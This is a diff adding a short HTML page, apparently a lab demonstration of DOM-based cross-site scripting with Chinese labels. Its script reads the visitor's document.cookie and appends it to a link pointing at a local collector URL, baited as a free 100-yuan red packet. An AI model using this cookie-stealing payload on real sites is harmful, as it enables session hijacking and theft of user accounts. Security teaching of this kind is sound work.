@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>DOMBasedXSS（基于dom的跨站点脚本攻击）</title>
+</head>
+<body>
+
+    <H1>DOMBasedXSS（基于dom的跨站点脚本攻击）</H1>
+    <div id="test"></div>
+    <script>
+        var acookie = document.cookie;
+        var fakelink =document.createElement('a');
+        fakelink.href='http://127.0.0.1:8000/index/result/?'+acookie;
+        fakelink.innerHTML="点我送100红包";
+        document.body.appendChild(fakelink);
+    </script>
+
+</body>
+</html>
